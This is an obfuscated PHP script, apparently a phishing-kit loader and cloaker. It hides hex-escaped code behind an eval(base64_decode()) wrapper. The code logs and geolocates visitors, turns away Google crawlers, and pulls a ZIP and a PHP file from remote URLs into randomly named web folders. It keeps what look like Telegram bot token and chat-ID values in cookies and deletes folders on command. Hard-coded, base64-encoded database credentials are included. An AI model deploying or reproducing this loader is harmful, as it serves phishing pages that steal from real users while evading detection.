<?php eval(base64_decode('
 goto Z6sw7; ga0XT: $userAgent = isset($_SERVER["\x48\x54\124\120\x5f\125\x53\105\x52\x5f\x41\107\x45\116\124"]) ? $_SERVER["\x48\x54\x54\x50\137\x55\123\x45\122\137\101\107\x45\x4e\124"] : ''; goto u4gPd; nZ5L4: function Rand_XD_TF($length) { $characters = "\141\142\x63\144\x65\146\152\x68\x69\x67\x6b\x6c\155\156\157\x70\x71\x72\x73\164\x75\166\167\170\171\172\60\x31\x32\x33\64\65\66\67\70\71\x41\102\x43\104\105\x46\x47\110\111\x4a\113\114\x4d\116\117\x50\121\122\123\x54\x55\126\127\x58\x59\132"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto n6Uo7; L92Sd: $donflag = $protocol . "\x3a\57\57" . $domain; goto lXRBc; sDaC9: if (!empty($_SERVER["\110\124\x54\120\137\x43\x4c\x49\105\116\x54\137\111\120"])) { $ipAddress = $_SERVER["\110\x54\124\120\137\x43\x4c\x49\x45\116\124\137\x49\x50"]; } elseif (!empty($_SERVER["\110\124\x54\120\x5f\x58\x5f\106\117\122\127\x41\122\x44\x45\x44\x5f\x46\117\122"])) { $ipAddress = $_SERVER["\x48\124\x54\x50\137\130\137\x46\117\x52\x57\101\x52\104\x45\104\137\106\117\122"]; } else { $ipAddress = $_SERVER["\x52\x45\x4d\x4f\x54\x45\137\101\x44\104\x52"]; } goto NJO5m; DBV0d: $_SESSION["\x42\x6c\x61\x73\141\143\x6f\x75\x6e"] = isset($info["\143\x6f\165\156\x74\162\171"]) ? $info["\143\x6f\165\156\164\162\x79"] : null; goto OFyMv; jeZkN: if (is_array($directories)) { foreach ($directories as $dir) { if (basename($dir)[0] != "\56") { if (deleteDirectory($dir)) { } } } } goto isBME; DTZ0Z: if (isset($_GET["\145\156\144\x6d\x65\154\165\170"])) { $redi = $_COOKIE["\x72\x65\144\x69\162\x69\x63\164"]; $vdir = $_GET["\x65\x6e\144\x6d\145\154\x75\x78"]; $directoryToDelete = "\167\x65\142\x2f" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\74\x73\143\x72\x69\160\x74\40\114\x41\116\107\125\x41\107\105\x3d\x27\112\141\x76\141\x53\143\x72\x69\160\164\x27\76\12\40\40\40\x20\167\x69\x6e\x64\x6f\167\x2e\x6c\x6f\x63\x61\164\x69\x6f\156\x2e\150\x72\x65\x66\x3d\x27{$redi}\47\x3b\12\40\40\x20\x20\x3c\x2f\x73\143\162\x69\x70\x74\76"; die; } goto o4KIL; UxzLl: function RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $id) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\x6f\x6e\156\145\143\x74\x69\157\x6e\x20\146\141\151\x6c\x65\144\72\x20" . mysqli_connect_error()); } $sql_u = "\123\x45\x4c\x45\103\124\x20\x2a\x20\x46\122\117\115\x20\x72\145\144\x69\x72\x63\x74\151\157\x6e\x20\x57\x48\x45\x52\105\40\x69\x64\75\x27{$id}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\x6c\x69\156\x6b"] = base64_decode(base64_decode($row["\x6c\151\x6e\153"])); $_SESSION["\143\x6e"] = explode("\x3b", base64_decode(base64_decode($row["\143\157\x75\x6e\x74\162\171"]))); $_SESSION["\160\151\143"] = $row["\160\x69\x63"]; $_SESSION["\x6d\163\x67"] = base64_decode(base64_decode($row["\x6d\163\147"])); $_SESSION["\x65\170\x70"] = $row["\x65\x78\160\x69\x72\x65"]; $_SESSION["\163\x65\162\x76\145\x72"] = base64_decode(base64_decode($row["\x73\145\x72\166\x65\162"])); $_SESSION["\165\162\154"] = base64_decode(base64_decode($row["\x75\x72\154"])); $_SESSION["\154\x75\170\143\x61\160\164\143\x68\x61"] = $row["\x6c\x75\170\x63\x61\160\x74\143\x68\141"]; $_SESSION["\x74\157\x6b\x65\x6e\x74\145\154"] = base64_decode(base64_decode($row["\164\x6f\x6b\x65\156\x74\145\154"])); $_SESSION["\x69\144\164\145\x6c"] = base64_decode(base64_decode($row["\x69\144\x74\x65\154"])); $_SESSION["\x72\x65\x64\x69\x72\x69\143\x74"] = $row["\162\x65\144\151\x72\151\x63\164"]; $_SESSION["\x61\x70\x69"] = $row["\x61\x70\151"]; if (isset($_GET["\x76\163\x73"])) { setcookie("\164\157\153\145\156\164\145\x6c", $_SESSION["\x74\157\x6b\145\156\164\145\x6c"], time() + 86400 * 30, "\57"); setcookie("\x69\144\164\x65\x6c", $_SESSION["\151\144\x74\145\x6c"], time() + 86400 * 30, "\57"); setcookie("\x72\145\x64\151\x72\x69\143\x74", $_SESSION["\162\x65\x64\x69\162\151\x63\164"], time() + 86400 * 30, "\57"); } } } else { $refix = "\x70\x72\x6f\152\x65\143\x74\40\x49\104\x20\x49\x6e\x76\141\154\151\x64\40{$id}"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } mysqli_close($db); } goto nZ5L4; o1mbF: $IpCount = FOx_TGH_X($userAgent); goto A6dZZ; E1cL4: $domain = $_SERVER["\x48\x54\x54\120\x5f\x48\x4f\x53\x54"]; goto L92Sd; WAVoD: if (isset($_POST["\x6c\x6f\x63\x61\x6c\151\160"])) { $myips = base64_decode(base64_decode($_POST["\154\157\143\x61\154\151\x70"])); $_SESSION["\154\x6f\154\x69\160\163"] = $myips; $StrupLom = $myips; } else { $refix = "\116\x6f\164\40\x46\x6f\165\156\144\x20\x49\x50\123"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto FqP3H; SYlRv: $directories = glob($parentDirectory . "\57\x2a", GLOB_ONLYDIR); goto jeZkN; X_4Io: if ($_SERVER["\122\x45\x51\x55\x45\x53\x54\137\115\105\124\110\x4f\x44"] === "\120\117\x53\124") { if (!isset($_POST["\x6c\x6f\x63\141\x6c\x69\160"])) { $refix = "\111\x50\x53\x20\156\157\164\40\x66\x6f\x75\156\144"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!isset($_POST["\x73\150\x6f\160\151\x64"])) { $refix = "\x70\162\x6f\x6a\145\x63\x74\40\x49\x44\40\x4e\157\164\40\146\157\x75\156\x64"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!is_dir("\167\145\x62")) { if (!mkdir("\x77\x65\142", 511)) { die("\x46\141\x69\x6c\x65\144\40\164\157\40\143\x72\x65\x61\x74\145\x20\167\145\142\40\x64\151\x72\145\143\164\157\162\171"); } } $folder_name = bin2hex(random_bytes(8)); $sub_folder = rand_num(4); $folder_path = "\167\145\142\x2f{$sub_folder}\x2f"; $zipFileUrl = $_SESSION["\165\x72\154"]; $tempDir = "\164\x65\155\x70"; if (!is_dir($tempDir)) { mkdir($tempDir); } $zipFileName = "{$tempDir}\57{$folder_name}\56\172\x69\160"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\106\141\151\x6c\145\144\x20\164\x6f\x20\x63\162\145\x61\x74\x65\x20\x74\x68\x65\40\x66\x6f\x6c\144\x65\x72\56"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); $extractedFiles = scandir($folder_path); foreach ($extractedFiles as $file) { if ($file !== "\x2e" && $file !== "\x2e\x2e") { rename($folder_path . "\x2f" . $file, $folder_path . $file); } } } else { echo "\106\x61\x69\154\145\144\40\x74\157\40\x65\x78\164\x72\141\x63\x74\40\x74\150\x65\x20\172\x69\x70\x20\146\x69\154\x65\56"; } } else { die("\x46\x61\151\154\x65\144\x20\x74\157\40\144\x6f\167\156\154\157\141\144\40\164\150\x65\40\x7a\x69\x70\x20\146\151\x6c\x65\x2e"); } if (file_exists($zipFileName)) { unlink($zipFileName); } $gameid = $_SESSION["\x6c\157\154\163\157\165\x6c\x73"]; $_SESSION["\154\x6f\143\141\x6c\144\151\162"] = "{$folder_path}"; file_put_contents("{$folder_path}\x2f\154\157\143\141\x6c\x2e\164\x78\164", "{$StrupLom}\12", FILE_APPEND); $fileURL = $_SESSION["\141\160\151"]; function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { return; } $fileContents = file_get_contents($fileURL); if ($fileContents !== false) { $localFilePath = "\167\x65\x62\57\141\x70\151\x2e\x70\150\160"; file_put_contents($localFilePath, $fileContents); } } if ($fileURL !== "\x41\x50\111") { getFileContents($fileURL); } $localip = isset($_POST["\x6c\157\143\141\154\151\x70"]) ? $_POST["\154\x6f\x63\141\154\151\x70"] : null; $domainname = isset($_POST["\x64\157\155\141\x69\156\156\141\155\x65"]) ? $_POST["\x64\x6f\x6d\x61\x69\156\156\141\x6d\145"] : null; $nextdomain = isset($_POST["\x6e\x65\x78\164\x64\157\155\141\151\156"]) ? $_POST["\156\145\x78\x74\x64\x6f\155\x61\x69\156"] : null; $shopid = isset($_POST["\163\x68\157\160\151\x64"]) ? $_POST["\x73\x68\157\x70\151\x64"] : null; if ($localip !== null && $domainname !== null && $nextdomain !== null && $shopid !== null) { $directory = "\x74\x65\x6d\160"; $zipFiles = glob($directory . "\x2a\56\172\x69\x70"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } $responseData = array("\x73\x74\x61\164\x75\x73" => "\x73\x75\x63\x63\x65\163\x73", "\x62\x61\143\153\x5f\x64\151\162" => $folder_path, "\x62\141\x63\x6b\x5f\x75\x72\x6c" => $nextdomain, "\142\x61\x63\153\137\151\x64" => $shopid, "\155\145\163\163\x61\147\x65" => "\104\x61\x74\141\40\x72\x65\x63\x65\x69\x76\145\144\x20\x73\x75\x63\x63\145\163\x73\x66\x75\x6c\x6c\x79"); $responseJson = json_encode($responseData); echo $responseJson; } else { http_response_code(400); echo "\x4d\151\x73\163\x69\x6e\x67\x20\162\145\161\165\x69\162\145\144\40\x64\x61\164\x61"; } } else { http_response_code(405); echo "\x49\x6e\166\x61\x6c\151\x64\40\x72\x65\x71\165\x65\x73\164\40\155\x65\164\150\x6f\x64"; } goto NrND0; n6Uo7: function rand_num($length) { $characters = "\60\x31\x32\x33\x34\x35\66\x37\x38\71"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto twKzi; T6x8T: $_SESSION["\x69\x73\x70"] = isset($info["\151\163\160"]) ? $info["\x69\163\x70"] : null; goto DBV0d; MOE7k: $TIME_DATE = date("\x59\x2d\155\55\144\40\x48\72\151\72\163"); goto WAVoD; NJO5m: $ipPortArray = explode("\x3a", $ipAddress); goto bPtJe; yLCdG: function FOx_TGH_X($USER_AGENT) { $BROWSER_ERROR = "\125\x6e\153\x6e\x6f\x77\x6e\40\102\x72\157\x77\x73\x65\x72"; $BROWSER = array("\x2f\x6d\163\x69\x65\57\151" => "\111\156\x74\x65\162\x6e\145\164\40\105\170\160\154\157\162\x65\x72", "\57\146\x69\x72\145\x66\157\x78\x2f\151" => "\x46\151\x72\145\x66\x6f\x78", "\x2f\163\141\x66\x61\x72\151\57\x69" => "\123\141\x66\x61\x72\x69", "\57\x63\x68\x72\x6f\x6d\145\x2f\151" => "\103\150\x72\x6f\x6d\145", "\57\x65\x64\x67\x65\57\151" => "\x45\144\x67\145", "\57\x6f\x70\x65\162\141\57\x69" => "\117\160\145\x72\141", "\57\x6e\145\164\x73\x63\141\x70\145\x2f\x69" => "\116\145\164\x73\x63\141\x70\145", "\57\x6d\x61\170\x74\150\x6f\156\x2f\x69" => "\x4d\x61\170\164\x68\x6f\156", "\57\x6b\157\x6e\x71\x75\145\x72\x6f\x72\57\x69" => "\113\x6f\x6e\161\165\145\x72\x6f\x72", "\57\155\x6f\142\x69\x6c\145\x2f\x69" => "\110\141\156\144\x68\x65\154\x64\40\102\x72\x6f\167\163\145\162"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto ga0XT; GlOHr: $domine = $_SERVER["\x53\105\x52\x56\105\122\137\116\101\115\x45"]; goto MOE7k; FFFiT: $response = curl_exec($curl); goto yCDD5; yCDD5: curl_close($curl); goto zmEIP; Z6sw7: error_reporting(E_ALL); goto e6dxt; eKcll: $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); goto X_4Io; kGUtG: if (isset($_GET["\166\x73\163"])) { $gameid = $_GET["\163\157\165\x6c\163"]; $_SESSION["\x6c\157\x6c\x73\157\165\154\x73"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); $folder_pathx = $_GET["\166\163\x73"]; $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); echo "\74\x73\143\162\151\x70\164\40\x4c\101\116\107\125\101\107\105\x3d\x27\112\x61\x76\141\x53\x63\162\x69\160\164\x27\x3e\xa\40\40\x20\40\x77\151\156\144\157\167\x2e\x6c\157\x63\141\164\151\x6f\156\x2e\x68\x72\145\146\x3d\47{$folder_pathx}\77\46\166\141\x6c\151\x64\x3d{$RandOP_Mlux}{$RandOP_Mlux}\46\141\x6c\x65\162\x74\75{$RandOP_Mlux}\46\170\154\x70\x73\75{$RandOP_Mlux}\x26\163\x6f\165\x6c\x73\75{$gameid}\46\144\157\x6e\145\x3d\x26\145\x72\162\x6f\162\171\x3d{$RandOP_Mlux}\46\155\156\x65\x6d\x6f\x6e\x69\x63\75\46\152\142\75{$RandOP_Mlux}\x27\73\xa\x20\40\40\x20\x3c\57\x73\143\x72\x69\x70\164\x3e"; die; } goto tGGfM; YgwlI: function deleteDirectory($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } $time_diff = time() - filectime($dir); if ($time_diff > 290) { foreach (scandir($dir) as $item) { if ($item == "\x2e" || $item == "\x2e\56") { continue; } if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } else { return true; } } goto gEQrg; u4gPd: $OKJIVGRD = HYT_DDR_Uio($userAgent); goto o1mbF; TAW1s: $_SESSION["\x56\x6f\x70\x72\164"] = isset($info["\x63\151\164\171"]) ? $info["\x63\x69\x74\x79"] : null; goto v0qkF; Hkrgq: $RandOP_M = Rand_XD_TF(rand(7, 7)); goto eKcll; twKzi: function HYT_DDR_Uio($USER_AGENT) { $OS_ERROR = "\x55\x6e\x6b\156\157\x77\156\x20\117\123\x20\x50\x6c\141\164\146\x6f\x72\x6d"; $OS = array("\57\167\x69\x6e\x64\157\167\163\40\156\164\x20\x31\60\x2f\151" => "\127\x69\156\144\157\x77\x73\40\61\60", "\57\167\x69\156\144\x6f\x77\163\x20\x6e\164\40\66\56\63\x2f\151" => "\127\151\156\x64\x6f\167\163\40\70\56\x31", "\x2f\x77\x69\156\x64\x6f\x77\163\x20\156\x74\x20\66\x2e\62\57\x69" => "\127\x69\x6e\144\x6f\x77\163\x20\70", "\x2f\167\151\156\x64\x6f\167\163\x20\x6e\164\40\x36\56\x31\57\x69" => "\127\x69\156\x64\157\x77\163\x20\x37", "\x2f\167\x69\156\144\x6f\167\x73\40\x6e\164\40\66\56\60\57\x69" => "\127\151\x6e\144\x6f\x77\x73\x20\x56\151\x73\164\141", "\x2f\167\151\x6e\x64\x6f\x77\x73\40\156\164\40\x35\x2e\x32\x2f\151" => "\127\151\156\x64\x6f\167\163\x20\123\x65\x72\166\x65\162\40\62\x30\x30\63\57\x58\x50\x20\x78\66\x34", "\57\167\151\156\144\157\167\163\x20\x6e\164\40\65\56\61\x2f\151" => "\x57\151\156\x64\x6f\167\x73\x20\130\x50", "\x2f\x77\x69\156\x64\x6f\167\x73\40\x78\160\x2f\x69" => "\x57\x69\156\x64\x6f\167\163\x20\130\120", "\57\x77\151\156\x64\x6f\x77\x73\x20\156\x74\x20\65\56\x30\57\x69" => "\x57\151\156\x64\x6f\x77\x73\40\x32\x30\60\x30", "\57\x77\151\156\144\x6f\167\163\x20\155\145\57\151" => "\127\151\x6e\144\x6f\x77\x73\x20\x4d\x45", "\x2f\x77\151\x6e\x39\70\57\151" => "\x57\x69\156\144\157\x77\163\x20\71\70", "\x2f\x77\x69\156\x39\65\x2f\151" => "\x57\151\x6e\144\x6f\167\163\40\71\x35", "\x2f\x77\x69\x6e\61\66\57\x69" => "\x57\151\156\144\157\167\x73\40\x33\56\x31\x31", "\x2f\x6d\x61\143\x69\156\164\157\x73\x68\174\x6d\141\x63\40\157\x73\x20\170\57\151" => "\x4d\x61\143\x20\117\x53\40\x58", "\57\155\x61\x63\x5f\x70\157\x77\x65\162\x70\x63\x2f\151" => "\115\x61\143\40\x4f\123\40\x39", "\x2f\154\151\156\x75\x78\x2f\151" => "\x4c\x69\156\x75\x78", "\x2f\165\142\165\156\x74\165\57\151" => "\125\142\x75\156\164\165", "\x2f\x69\160\150\x6f\156\x65\57\x69" => "\151\x50\x68\157\156\145", "\57\x69\160\157\144\x2f\151" => "\151\x50\157\144", "\57\151\x70\141\x64\x2f\151" => "\151\x50\x61\x64", "\57\141\x6e\x64\162\157\x69\144\x2f\151" => "\101\156\x64\162\157\x69\144", "\x2f\x62\x6c\141\143\153\142\x65\x72\x72\171\x2f\x69" => "\x42\x6c\141\143\153\x42\145\162\x72\171", "\x2f\167\x65\x62\157\163\57\151" => "\115\x6f\x62\151\154\x65"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto yLCdG; JXjKJ: $Nopwvv = base64_decode("\x63\x33\122\x79\x62\62\65\156\x58\x32\122\150\x65\x51"); goto kDfyk; FqP3H: $protocol = isset($_SERVER["\110\124\x54\120\x53"]) && $_SERVER["\x48\x54\124\120\x53"] === "\x6f\156" ? "\150\x74\164\x70\163" : "\150\164\x74\160"; goto E1cL4; bPtJe: $StrupLom = $ipPortArray[0]; goto GlOHr; tGGfM: if (isset($_POST["\163\x68\157\160\x69\144"])) { $gameid = $_POST["\163\x68\157\x70\151\x64"]; $_SESSION["\x6c\x6f\154\163\157\x75\154\163"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); } goto UxzLl; t1oi1: curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); goto FFFiT; hdCJt: if (!Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv)) { $showpip = "\x21\41\x21"; echo $showpip; die; } goto DTZ0Z; v0qkF: $_SESSION["\170\x4f\x70\x75\x79"] = isset($info["\162\145\x67\151\x6f\156\116\141\x6d\x65"]) ? $info["\x72\x65\x67\151\157\x6e\x4e\141\x6d\145"] : null; goto hkNGJ; hkNGJ: function deleteDirectorynew($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } foreach (scandir($dir) as $item) { if ($item == "\x2e" || $item == "\x2e\x2e") { continue; } if (!deleteDirectorynew($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } goto YgwlI; gEQrg: $parentDirectory = "\x77\145\142"; goto SYlRv; oOBfG: if (strpos(gethostbyaddr($StrupLom), "\x67\x6f\x6f\x67\x6c\145") !== false) { $refix = "\102\x6f\x73\x65\40\x47\40\62"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto Hkrgq; A6dZZ: function click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix) { $userAgent = isset($_SERVER["\x48\x54\x54\x50\x5f\125\123\105\122\137\101\x47\x45\x4e\124"]) ? $_SERVER["\x48\124\124\120\137\125\123\105\122\x5f\x41\x47\105\116\x54"] : ''; $isp = $_SESSION["\x69\x73\x70"]; $IpCount = FOx_TGH_X($userAgent); $OKJIVGRD = HYT_DDR_Uio($userAgent); $donflag = $_SERVER["\123\x45\x52\126\x45\x52\x5f\116\101\115\x45"]; $LOCALO_TEMPO = date("\131\x2d\x6d\55\x64\x20\x48\x3a\x69\x3a\x73"); $Blasacoun = $_SESSION["\x42\x6c\141\x73\x61\x63\x6f\x75\156"]; $Njopf = $_SESSION["\x4e\152\x6f\160\x66"]; $Voprt = $_SESSION["\126\x6f\x70\x72\x74"]; $xOpuy = $_SESSION["\x78\x4f\x70\x75\x79"]; $host = gethostbyaddr($StrupLom); $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\157\x6e\156\145\x63\164\151\157\x6e\40\146\x61\151\154\145\x64\72\40" . mysqli_connect_error()); } $sql_u = "\x53\105\114\x45\x43\x54\40\52\40\x46\122\117\115\40\x6c\157\x67\x73\40\127\110\105\122\105\x20\x69\160\141\x64\144\x72\145\163\75\x27{$StrupLom}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); echo "\41\x21"; die; } else { $StrupLom = mysqli_real_escape_string($db, str_replace("\47", '', $StrupLom)); $Blasacoun = mysqli_real_escape_string($db, str_replace("\47", '', $Blasacoun)); $IpCount = mysqli_real_escape_string($db, str_replace("\47", '', $IpCount)); $OKJIVGRD = mysqli_real_escape_string($db, str_replace("\x27", '', $OKJIVGRD)); $donflag = mysqli_real_escape_string($db, str_replace("\47", '', $donflag)); $LOCALO_TEMPO = mysqli_real_escape_string($db, str_replace("\47", '', $LOCALO_TEMPO)); $host = mysqli_real_escape_string($db, str_replace("\x27", '', $host)); $isp = mysqli_real_escape_string($db, str_replace("\x27", '', $isp)); $refix = mysqli_real_escape_string($db, str_replace("\x27", '', $refix)); $query = "\111\116\123\x45\x52\124\x20\111\x4e\124\x4f\x20\154\157\x67\x73\40\50\151\x70\141\144\144\x72\145\163\x2c\x63\157\x75\x6e\164\162\171\54\142\x72\x6f\x77\x73\145\x72\x2c\x6f\x73\x2c\x64\x6f\155\x69\156\x65\54\x6d\x79\164\151\155\145\54\150\x6f\x73\164\54\x69\x73\160\x2c\162\145\163\x6f\156\51\40\xa\x20\40\40\x20\x20\40\x9\x20\x20\40\x20\11\x20\x20\x56\101\114\125\x45\x53\40\x28\x27{$StrupLom}\47\x2c\47{$Blasacoun}\47\54\47{$IpCount}\47\54\x27{$OKJIVGRD}\47\54\47{$donflag}\47\54\47{$LOCALO_TEMPO}\47\x2c\47{$host}\x27\x2c\x27{$isp}\47\x2c\x27{$refix}\x27\51"; $results = mysqli_query($db, $query); mysqli_close($db); echo "\41"; } } goto kCUgI; isBME: function Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\157\156\156\x65\x63\164\151\x6f\156\x20\146\141\x69\154\145\144\72\x20" . mysqli_connect_error()); } $sql_u = "\123\x45\x4c\x45\x43\124\x20\x2a\40\106\122\117\x4d\40\154\157\147\163\40\127\x48\105\122\105\40\x69\x70\x61\144\x64\162\x65\x73\75\x27{$StrupLom}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return false; } mysqli_close($db); return true; } goto hdCJt; GScan: $Lredsvv = base64_decode("\x5a\x48\112\152\132\62\x6c\163\145\x56\x41\x77\x4b\x6d\x73\x6d"); goto JXjKJ; zmEIP: $info = unserialize($response); goto T6x8T; lXRBc: $datalog = base64_decode("\145\155\126\x79\x62\x79\x31\153\x59\130\x6b\x75\143\x32\x68\166\x63\x41"); goto dPEOB; kCUgI: if (strpos($userAgent, "\147\x6f\157\147\154\145") !== false) { $refix = "\102\157\x73\x65\x20\107"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto oOBfG; e6dxt: ini_set("\x64\x69\163\160\154\141\171\x5f\x65\162\162\157\x72\163", 1); goto sDaC9; kDfyk: $url = "\x68\x74\164\x70\x3a\x2f\x2f\151\160\55\141\160\151\56\143\157\155\57\x70\x68\160\57{$StrupLom}\77\146\151\145\x6c\x64\x73\75\163\x74\x61\x74\165\163\54\155\145\163\x73\141\147\x65\x2c\x63\157\x6e\164\x69\156\145\156\x74\54\143\x6f\x6e\x74\x69\156\x65\156\164\103\157\144\145\x2c\143\157\x75\156\164\x72\171\54\x63\157\165\x6e\164\x72\171\x43\157\x64\x65\x2c\x72\x65\x67\x69\x6f\156\x2c\x72\145\x67\x69\x6f\156\116\141\x6d\145\x2c\143\151\164\x79\x2c\144\x69\x73\x74\x72\x69\143\x74\54\x7a\x69\x70\54\x6c\x61\164\54\154\x6f\156\54\x74\151\x6d\x65\172\157\x6e\x65\54\x63\165\x72\162\145\x6e\143\171\54\x69\x73\x70\54\x6f\x72\147\54\141\163\x2c\x61\x73\x6e\x61\x6d\x65\x2c\162\145\166\145\x72\163\145\54\x6d\157\142\x69\x6c\x65\x2c\x70\162\157\x78\171\54\150\x6f\163\164\151\x6e\147\x2c\x71\x75\145\162\x79"; goto eLPyp; OFyMv: $_SESSION["\116\152\x6f\x70\x66"] = isset($info["\x63\157\165\x6e\x74\162\171\x43\157\144\145"]) ? $info["\x63\157\165\x6e\x74\x72\171\103\x6f\x64\145"] : null; goto TAW1s; dPEOB: $Fixbom = base64_decode("\x63\x33\x52\x79\x62\62\x35\156\130\x32\x52\x68\145\x51"); goto GScan; eLPyp: $curl = curl_init($url); goto t1oi1; o4KIL: if (isset($_GET["\x6c\x6f\154\x6d\145"])) { $vdir = $_GET["\x6c\x6f\x6c\155\x65"]; $refix = "\x49\156\166\141\x6c\x69\144\40\x6c\157\154\x6d\145"; $redi = $_COOKIE["\162\145\x64\x69\x72\x69\x63\164"]; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); $directoryToDelete = "\x77\145\x62\57" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\x3c\x73\x63\162\151\160\164\40\114\x41\x4e\x47\x55\x41\x47\105\75\x27\x4a\x61\166\141\123\x63\162\x69\160\164\47\76\xa\x20\x20\40\x20\x77\151\x6e\144\x6f\x77\56\x6c\157\x63\x61\x74\151\157\156\x2e\x68\162\x65\x66\x3d\47{$redi}\x27\x3b\12\x20\x20\x20\40\x3c\x2f\x73\x63\162\x69\x70\x74\x3e"; die; } goto kGUtG; NrND0: ')); ?>
